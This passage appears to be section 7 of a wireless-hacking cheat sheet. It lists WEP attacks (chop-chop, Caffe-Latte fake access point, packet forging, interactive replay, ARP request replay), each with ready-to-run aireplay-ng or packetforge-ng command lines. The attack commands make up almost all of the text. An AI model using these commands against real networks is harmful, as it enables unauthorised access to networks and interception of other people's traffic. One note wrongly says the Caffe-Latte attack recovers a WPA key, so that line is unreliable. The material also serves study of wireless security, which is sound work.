#### 7.1. Chop-Chop attack

1) set interface in monitor more
2) scan for APs using WEP encryption
3) attack
```
# aireplay-ng wlan0 --chopchop -h <SRC_STATION> -b <BSSID>
```
Idea: decrypt single packet and obtain keystream in WEP networks


#### 7.2. Caffe-Latte attack (fake AP)

1) set interface in monitor more
2) scan for APs using WEP encryption
3) attack
```
# aireplay-ng --caffe-latte <SRC_STATION> -b <BSSID>
```
Notes:
- allows recovery of WPA key even if not within AP's range
- impersonate an AP and reply to connection requests from any client


#### 7.3. Generate packets w/o knowing the network key

1) enable monitoring mode
2) sniff for APs using WEP encryption
3) attack
```
# aireplay-ng wlan0 -5 -h <SRC_STATION> -b <BSSID>
# packetforge-ng -0 -a <BSSID> -h <SRC_STATION> -k <SRC_IP> -l <DST_IP> -y fragment.xor -w arp_req
```
Note: `packetforge-ng` (tool to create packets w/o knowing WEP key)


#### 7.4. Interactive packet replay

1) set interface in monitor more
2) scan for APs using WEP encryption
3) attack
```
# aireplay-ng wlan0 --interactive -t 1 -b <BSSID> -h <SRC_STATION> -c FF:FF:FF:FF:FF:FF -p 0841
```
Notes:
- replay one packet any number of times => generate traffic and new IVs
- 0841 = set `Frame Control Field / FCTRL`
- remember to increase the no. of transmitted packets manually


#### 7.5. ARP request replay
```
# aireplay-ng wlan0 --arpreplay -b <BSSID> -h <SRC_STATION>
```
